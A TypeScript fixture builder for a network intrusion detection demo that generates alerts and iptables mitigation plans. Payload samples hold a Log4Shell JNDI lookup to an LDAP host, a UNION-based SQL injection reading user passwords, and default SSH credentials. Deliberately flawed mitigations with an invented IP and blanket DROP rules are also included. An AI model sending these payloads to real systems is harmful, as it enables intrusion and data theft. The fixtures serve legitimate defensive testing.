import { DEVICE_BY_ID, NODE_IP, serviceName } from "@/data/devices";
import { fakeUuid, fmtBytes, fmtInt } from "@/lib/format";
import type {
  FlowMetrics,
  ActionPayload,
  ActionType,
  DeviceId,
  EvidenceItem,
  GRPORewardBreakdown,
  MitigationEnvelope,
  NIDSAlert,
  Severity,
  ThreatClass,
} from "@/types";

/**
 * DEMO DATA builders. They assemble schema-shaped alerts and envelopes from a
 * handful of parameters so fixtures stay compact and internally consistent.
 */

export type BenignKind = "rsync" | "flash_sale" | "health_check";

export interface AlertSpec {
  /** Seed for the deterministic alert id. */
  key: string;
  /** Explicit alert id (overrides the seeded one). */
  id?: string;
  ts: string;
  threat: ThreatClass;
  src: DeviceId;
  dst: DeviceId;
  port: number;
  benignKind?: BenignKind;
  pkts?: number;
  bytes?: number;
  synRatio?: number;
  ports?: number[];
  confidence?: number;
  severity?: Severity;
}

export interface BuiltAlert {
  alert: NIDSAlert;
  summary: string;
  evidence: EvidenceItem[];
}

export function buildAlert(spec: AlertSpec): BuiltAlert {
  const { src, dst, port } = spec;
  const svc = serviceName(port);
  const base = {
    alert_id: spec.id ?? fakeUuid(spec.key),
    timestamp: spec.ts,
    source_node: src,
    source_ip: NODE_IP[src],
    target_node: dst,
    target_ip: NODE_IP[dst],
    dest_port: port,
  };

  switch (spec.threat) {
    case "SYN_FLOOD": {
      const pkts = spec.pkts ?? 5420;
      const ratio = spec.synRatio ?? 0.97;
      const bytes = spec.bytes ?? pkts * 60;
      return {
        alert: {
          ...base,
          protocol: "TCP",
          flow_metrics: {
            packet_count_2s: pkts,
            byte_count_2s: bytes,
            syn_ratio: ratio,
            unique_dest_ports: [port],
            payload_sample: "[SYN flags only — no payload]",
          },
          nids_llm_assessment: {
            attack_signature: "TCP SYN Flood",
            mitre_tactic: "Impact",
            mitre_technique_id: "T1498.001",
            confidence_score: spec.confidence ?? 0.94,
            severity: spec.severity ?? (pkts > 4000 ? "CRITICAL" : "HIGH"),
            raw_telemetry_summary: `${fmtInt(pkts)} packets in a 2s window with syn_ratio ${ratio.toFixed(2)} and no completed handshakes toward port ${port} — consistent with a volumetric SYN flood.`,
          },
        },
        summary: `${src} sent about ${fmtInt(pkts)} connection-start packets to the ${svc} on ${dst} in two seconds, and almost none of them completed. That pattern is typical of a flood meant to keep the server too busy to answer real customers.`,
        evidence: [
          { label: "Packets in 2s window", value: fmtInt(pkts), signal: "suspicious" },
          { label: "SYN ratio", value: ratio.toFixed(2), signal: "suspicious" },
          { label: "Average packet size", value: `${Math.round(bytes / pkts)} B (no payload)`, signal: "suspicious" },
          { label: "Destination", value: `${NODE_IP[dst]}:${port}`, signal: "neutral" },
        ],
      };
    }
    case "RCE_ATTEMPT": {
      const pkts = spec.pkts ?? 22;
      const bytes = spec.bytes ?? 1840;
      return {
        alert: {
          ...base,
          protocol: "HTTP",
          flow_metrics: {
            packet_count_2s: pkts,
            byte_count_2s: bytes,
            syn_ratio: 0.1,
            unique_dest_ports: [port],
            payload_sample: "GET /api/login HTTP/1.1\\r\\nUser-Agent: ${jndi:ldap://172.28.0.1:1389/a}",
          },
          nids_llm_assessment: {
            attack_signature: "Log4j JNDI RCE Attempt (CVE-2021-44228)",
            mitre_tactic: "Initial Access",
            mitre_technique_id: "T1190",
            confidence_score: spec.confidence ?? 0.96,
            severity: spec.severity ?? "CRITICAL",
            raw_telemetry_summary: `Inbound HTTP request to port ${port} carries a JNDI lookup string in a request header, a known Log4Shell exploitation pattern.`,
          },
        },
        summary: `${src} sent a web request to the ${svc} on ${dst} with a hidden instruction in one of its headers. This is a known trick for making a vulnerable server run an attacker's code.`,
        evidence: [
          { label: "Payload", value: "JNDI lookup string in User-Agent header", signal: "suspicious" },
          { label: "Packets in 2s window", value: fmtInt(pkts), signal: "neutral" },
          { label: "Traffic volume", value: fmtBytes(bytes), signal: "neutral" },
          { label: "Destination", value: `${NODE_IP[dst]}:${port}`, signal: "neutral" },
        ],
      };
    }
    case "SQL_INJECTION": {
      const pkts = spec.pkts ?? 14;
      const bytes = spec.bytes ?? 1260;
      return {
        alert: {
          ...base,
          protocol: "HTTP",
          flow_metrics: {
            packet_count_2s: pkts,
            byte_count_2s: bytes,
            syn_ratio: 0.04,
            unique_dest_ports: [port],
            payload_sample: "GET /products?id=1' UNION SELECT username,password FROM users--",
          },
          nids_llm_assessment: {
            attack_signature: "SQL Injection (UNION-based)",
            mitre_tactic: "Initial Access",
            mitre_technique_id: "T1190",
            confidence_score: spec.confidence ?? 0.91,
            severity: spec.severity ?? "HIGH",
            raw_telemetry_summary: `Request to port ${port} contains SQL meta-characters and a UNION/tautology pattern consistent with an attempt to manipulate the backend database query.`,
          },
        },
        summary: `${src} sent a request to the ${svc} on ${dst} with database commands hidden inside a web address. This is how attackers try to read customer data they should not see.`,
        evidence: [
          { label: "Payload", value: "UNION SELECT … FROM users", signal: "suspicious" },
          { label: "SYN ratio", value: "0.04", signal: "benign" },
          { label: "Packets in 2s window", value: fmtInt(pkts), signal: "neutral" },
          { label: "Destination", value: `${NODE_IP[dst]}:${port}`, signal: "neutral" },
        ],
      };
    }
    case "SSH_BRUTE_FORCE": {
      const pkts = spec.pkts ?? 380;
      const bytes = spec.bytes ?? 74000;
      return {
        alert: {
          ...base,
          protocol: "TCP",
          flow_metrics: {
            packet_count_2s: pkts,
            byte_count_2s: bytes,
            syn_ratio: spec.synRatio ?? 0.27,
            unique_dest_ports: [22],
            payload_sample: "[SSH-2.0 handshake, repeated auth failures: admin/123456, root/toor, admin/admin ...]",
          },
          nids_llm_assessment: {
            attack_signature: "SSH Brute Force Login Attempt",
            mitre_tactic: "Credential Access",
            mitre_technique_id: "T1110.001",
            confidence_score: spec.confidence ?? 0.89,
            severity: spec.severity ?? "HIGH",
            raw_telemetry_summary: `Dozens of sequential SSH authentication failures in the window against port 22, consistent with an automated password-guessing attempt.`,
          },
        },
        summary: `${src} keeps trying to log in to the ${svc} on ${dst} with common passwords, many attempts per second. A real administrator would not fail this many times in a row.`,
        evidence: [
          { label: "Packets in 2s window", value: fmtInt(pkts), signal: "suspicious" },
          { label: "Pattern", value: "Repeated authentication failures", signal: "suspicious" },
          { label: "Credentials tried", value: "admin/123456, root/toor, admin/admin …", signal: "suspicious" },
          { label: "Destination", value: `${NODE_IP[dst]}:22`, signal: "neutral" },
        ],
      };
    }
    case "PORT_SCAN": {
      const ports = spec.ports ?? [21, 22, 23, 25, 80, 443, 3306, 8080];
      const pkts = spec.pkts ?? ports.length * 4;
      return {
        alert: {
          ...base,
          dest_port: ports[0],
          protocol: "TCP",
          flow_metrics: {
            packet_count_2s: pkts,
            byte_count_2s: pkts * 70,
            syn_ratio: spec.synRatio ?? 0.92,
            unique_dest_ports: ports,
            payload_sample: "[TCP SYN probes across multiple ports — no payload]",
          },
          nids_llm_assessment: {
            attack_signature: "TCP Sequential Port Scan",
            mitre_tactic: "Discovery",
            mitre_technique_id: "T1046",
            confidence_score: spec.confidence ?? 0.82,
            severity: spec.severity ?? "MEDIUM",
            raw_telemetry_summary: `Single source probed ${ports.length} distinct destination ports within the window with a high SYN ratio and no completed sessions, consistent with reconnaissance.`,
          },
        },
        summary: `${src} knocked on ${ports.length} different doors (ports) on ${dst} within two seconds. That is how someone maps out which services a machine offers before choosing how to attack it.`,
        evidence: [
          { label: "Distinct ports probed", value: `${ports.length} (${ports.join(", ")})`, signal: "suspicious" },
          { label: "SYN ratio", value: (spec.synRatio ?? 0.92).toFixed(2), signal: "suspicious" },
          { label: "Packets in 2s window", value: fmtInt(pkts), signal: "neutral" },
          { label: "Payload", value: "None — probes only", signal: "suspicious" },
        ],
      };
    }
    case "BENIGN":
    default: {
      return buildBenign(spec, base);
    }
  }
}

function buildBenign(
  spec: AlertSpec,
  base: Pick<NIDSAlert, "alert_id" | "timestamp" | "source_node" | "source_ip" | "target_node" | "target_ip" | "dest_port">,
): BuiltAlert {
  const { src, dst, port } = spec;
  const kind: BenignKind = spec.benignKind ?? "health_check";
  if (kind === "flash_sale") {
    const pkts = spec.pkts ?? 2762;
    const bytes = spec.bytes ?? 1_860_000;
    return {
      alert: {
        ...base,
        protocol: "TCP",
        flow_metrics: {
          packet_count_2s: pkts,
          byte_count_2s: bytes,
          syn_ratio: spec.synRatio ?? 0.07,
          unique_dest_ports: [port],
          payload_sample: "[TLS application data — encrypted, no exploit signature visible]",
        },
        nids_llm_assessment: {
          attack_signature: "Volumetric Traffic Surge — Likely Benign",
          mitre_tactic: "None",
          mitre_technique_id: "T0000",
          confidence_score: spec.confidence ?? 0.42,
          severity: spec.severity ?? "LOW",
          raw_telemetry_summary: `${fmtInt(pkts)} packets (${fmtBytes(bytes)}) in 2s toward port ${port}, but with a low SYN ratio and completed sessions — volume alone, no flood or exploit pattern.`,
        },
      },
      summary: `Traffic to the ${serviceName(port)} on ${dst} jumped sharply: about ${fmtInt(pkts)} packets in two seconds. That is exactly what a flash sale looks like, and also what an attack can look like. The details point to genuine shoppers: connections complete normally and nothing in the traffic looks like an exploit.`,
      evidence: [
        { label: "Packets in 2s window", value: `${fmtInt(pkts)} (high)`, signal: "neutral" },
        { label: "Traffic volume", value: `${fmtBytes(bytes)} in 2s`, signal: "neutral" },
        { label: "SYN ratio", value: `${(spec.synRatio ?? 0.07).toFixed(2)} — connections complete normally`, signal: "benign" },
        { label: "Payload", value: "Encrypted TLS — no exploit signature visible", signal: "benign" },
        { label: "Source role", value: `${src} is the ${DEVICE_BY_ID[src].role.toLowerCase()}`, signal: "benign" },
      ],
    };
  }
  if (kind === "rsync") {
    const pkts = spec.pkts ?? 1842;
    const bytes = spec.bytes ?? 2_340_000;
    return {
      alert: {
        ...base,
        protocol: "TCP",
        flow_metrics: {
          packet_count_2s: pkts,
          byte_count_2s: bytes,
          syn_ratio: 0.03,
          unique_dest_ports: [port],
          payload_sample: "[SSH-2.0 transport, rsync-over-ssh bulk transfer — encrypted]",
        },
        nids_llm_assessment: {
          attack_signature: "Benign Traffic Spike (bulk backup transfer)",
          mitre_tactic: "None",
          mitre_technique_id: "T0000",
          confidence_score: spec.confidence ?? 0.48,
          severity: spec.severity ?? "LOW",
          raw_telemetry_summary: `${fmtInt(pkts)} packets (${fmtBytes(bytes)}) in 2s over a single long-lived session with a very low SYN ratio — sustained bulk transfer, not a flood.`,
        },
      },
      summary: `${src} is sending a large amount of data to ${dst} over a single, steady connection. That looks like a scheduled backup copy, not an attack.`,
      evidence: [
        { label: "Packets in 2s window", value: fmtInt(pkts), signal: "neutral" },
        { label: "Traffic volume", value: `${fmtBytes(bytes)} in 2s`, signal: "neutral" },
        { label: "SYN ratio", value: "0.03 — one long-lived session", signal: "benign" },
        { label: "Pattern", value: "Sustained bulk transfer between two internal nodes", signal: "benign" },
      ],
    };
  }
  const pkts = spec.pkts ?? 18;
  return {
    alert: {
      ...base,
      protocol: "HTTP",
      flow_metrics: {
        packet_count_2s: pkts,
        byte_count_2s: spec.bytes ?? 1100,
        syn_ratio: 0.1,
        unique_dest_ports: [port],
        payload_sample: "GET /healthz HTTP/1.1\\r\\nHost: pc-3",
      },
      nids_llm_assessment: {
        attack_signature: "Benign Traffic Spike (health-check burst)",
        mitre_tactic: "None",
        mitre_technique_id: "T0000",
        confidence_score: spec.confidence ?? 0.35,
        severity: "LOW",
        raw_telemetry_summary: `Brief burst of identical GET /healthz requests to port ${port}; no exploit signature, flood ratio or brute-force pattern.`,
      },
    },
    summary: `${src} sent a quick burst of identical "are you alive?" requests to ${dst}. That is typical of a monitoring probe and carries no attack signature.`,
    evidence: [
      { label: "Request", value: "GET /healthz (identical)", signal: "benign" },
      { label: "Packets in 2s window", value: fmtInt(pkts), signal: "neutral" },
      { label: "Exploit signature", value: "None found", signal: "benign" },
    ],
  };
}

/* ------------------------------------------------------------------ */
/* Envelopes                                                            */
/* ------------------------------------------------------------------ */

export const PERFECT_REWARD: GRPORewardBreakdown = {
  schema_compliance_score: 2.0,
  entity_grounding_score: 3.0,
  surgical_precision_score: 3.0,
  total_reward: 8.0,
};

function payload(
  alert: NIDSAlert,
  action_type: ActionType,
  iptables_cmd: string,
  estimated_collateral_impact: ActionPayload["estimated_collateral_impact"],
): ActionPayload {
  return {
    action_type,
    target_container: alert.target_node,
    source_ip: alert.source_ip,
    dest_port: alert.dest_port,
    iptables_cmd,
    estimated_collateral_impact,
  };
}

const blockCmd = (a: NIDSAlert, withPort = true) =>
  `iptables -A INPUT -s ${a.source_ip} -p ${a.protocol === "UDP" ? "udp" : "tcp"}${withPort ? ` --dport ${a.dest_port}` : ""} -j DROP`;
const rateLimitCmd = (a: NIDSAlert) =>
  `iptables -A INPUT -s ${a.source_ip} -p tcp --dport ${a.dest_port} --syn -m limit --limit 20/second --limit-burst 40 -j ACCEPT`;
const dropPortCmd = (a: NIDSAlert) => `iptables -A INPUT -p tcp --dport ${a.dest_port} -j DROP`;
const isolateCmd = () => "iptables -A INPUT -j DROP";

export interface EnvelopeOptions {
  chosen?: ActionType;
  reward?: GRPORewardBreakdown;
}

/** Well-formed envelope for an alert: surgical action chosen, over-broad one rejected. */
export function buildEnvelope(alert: NIDSAlert, threat: ThreatClass, opts: EnvelopeOptions = {}): MitigationEnvelope {
  const m = alert.flow_metrics as FlowMetrics;
  const port = alert.dest_port;
  const svc = serviceName(port);
  const severity = alert.nids_llm_assessment.severity;
  const reward = opts.reward ?? PERFECT_REWARD;

  if (threat === "BENIGN") {
    return {
      threat_classification: "BENIGN",
      severity,
      reasoning_trace: `${fmtInt(m.packet_count_2s)} packets in 2s is high, but syn_ratio ${m.syn_ratio.toFixed(2)} shows connections completing normally and the payload shows no exploit signature. Volume alone does not prove malicious intent, so no firewall change is warranted. Keep monitoring.`,
      chosen_mitigation: payload(alert, "NO_OP", "# NO_OP", "ZERO"),
      rejected_alternative: payload(alert, "BLOCK_SOURCE_IP", blockCmd(alert), "MODERATE"),
      rejection_reason: `Blocking ${alert.source_ip} would cut off legitimate traffic to the ${svc} and cause an outage for valid users.`,
      grpo_scoring_debug: reward,
    };
  }

  if (threat === "PORT_SCAN") {
    return {
      threat_classification: "PORT_SCAN",
      severity,
      reasoning_trace: `A single source touched ${m.unique_dest_ports.length} different ports with syn_ratio ${m.syn_ratio.toFixed(2)} and no payload — reconnaissance. Blocking just the scanner's TCP traffic to ${alert.target_node} contains it without affecting other nodes.`,
      chosen_mitigation: payload(alert, "BLOCK_SOURCE_IP", blockCmd(alert, false), "LOW"),
      rejected_alternative: payload(alert, "ISOLATE_NODE", isolateCmd(), "HIGH"),
      rejection_reason: `Isolating ${alert.target_node} would take every service on it offline to stop a scan that only needs one source blocked.`,
      grpo_scoring_debug: reward,
    };
  }

  const chosenAction: ActionType = opts.chosen ?? "BLOCK_SOURCE_IP";
  const chosen =
    chosenAction === "RATE_LIMIT_SYN"
      ? payload(alert, "RATE_LIMIT_SYN", rateLimitCmd(alert), "LOW")
      : payload(alert, "BLOCK_SOURCE_IP", blockCmd(alert), "LOW");

  const reasoning: Record<ThreatClass, string> = {
    SYN_FLOOD: `${fmtInt(m.packet_count_2s)} packets in 2s with syn_ratio ${m.syn_ratio.toFixed(2)} and no payload from a single source — a volumetric SYN flood. ${
      chosenAction === "RATE_LIMIT_SYN"
        ? "Rate-limiting SYNs from that source keeps the service reachable while the flood is throttled."
        : "Blocking only that source stops the flood while every other client keeps working."
    }`,
    RCE_ATTEMPT: `The request payload carries a JNDI lookup string, a known Log4Shell pattern aimed at the ${svc}. The source is a single node, so blocking that source on this port is enough.`,
    SQL_INJECTION: `The payload contains a UNION SELECT pattern aimed at the ${svc}. One source is responsible, so a source-specific block is proportionate.`,
    SSH_BRUTE_FORCE: `Repeated SSH authentication failures from one source at high speed — password guessing. Blocking that source on port 22 stops it without locking out other administrators.`,
    PORT_SCAN: "",
    BENIGN: "",
  };
  const reasonRejected: Record<ThreatClass, string> = {
    SYN_FLOOD: `Dropping all traffic to port ${port} would also cut off every legitimate customer of the ${svc}, turning the attack into a self-inflicted outage.`,
    RCE_ATTEMPT: `Isolating ${alert.target_node} would take every service on it offline, far beyond what one hostile source requires.`,
    SQL_INJECTION: `Dropping all traffic to port ${port} would deny service to every legitimate user of the ${svc}.`,
    SSH_BRUTE_FORCE: `Dropping all traffic to port ${port} would lock every administrator out of ${alert.target_node}.`,
    PORT_SCAN: "",
    BENIGN: "",
  };
  const rejected =
    threat === "RCE_ATTEMPT"
      ? payload(alert, "ISOLATE_NODE", isolateCmd(), "HIGH")
      : payload(alert, "DROP_PORT_TRAFFIC", dropPortCmd(alert), "HIGH");

  return {
    threat_classification: threat,
    severity,
    reasoning_trace: reasoning[threat],
    chosen_mitigation: chosen,
    rejected_alternative: rejected,
    rejection_reason: reasonRejected[threat],
    grpo_scoring_debug: reward,
  };
}

export type BadKind = "hallucinated" | "prerouting";

/**
 * A deliberately flawed first attempt that the Critic must reject, used to
 * demonstrate the correction loop. The flaws are real (computed by the Critic).
 */
export function buildBadEnvelope(alert: NIDSAlert, threat: ThreatClass, kind: BadKind): MitigationEnvelope {
  const good = buildEnvelope(alert, threat);
  if (kind === "hallucinated") {
    return {
      ...good,
      reasoning_trace: `Very high packet rate from the source. To be safe, lock down the whole node and stop everything until the situation is understood.`,
      chosen_mitigation: {
        action_type: "ISOLATE_NODE",
        target_container: alert.target_node,
        source_ip: "172.28.0.55",
        dest_port: alert.dest_port,
        iptables_cmd: "iptables -P INPUT DROP",
        estimated_collateral_impact: "HIGH",
      },
      rejected_alternative: good.chosen_mitigation,
      rejection_reason: "A single-IP block is too weak; isolating the node stops the flood completely.",
      grpo_scoring_debug: {
        schema_compliance_score: 2.0,
        entity_grounding_score: -2.25,
        surgical_precision_score: -3.0,
        total_reward: -3.25,
      },
    };
  }
  return {
    ...good,
    reasoning_trace: `${good.reasoning_trace} Apply the block early in packet processing.`,
    chosen_mitigation: {
      ...good.chosen_mitigation,
      iptables_cmd: `iptables -t nat -A PREROUTING -s ${alert.source_ip} -p tcp --dport ${alert.dest_port} -j DROP`,
    },
    grpo_scoring_debug: {
      schema_compliance_score: 2.0,
      entity_grounding_score: 0.75,
      surgical_precision_score: -3.0,
      total_reward: -0.25,
    },
  };
}
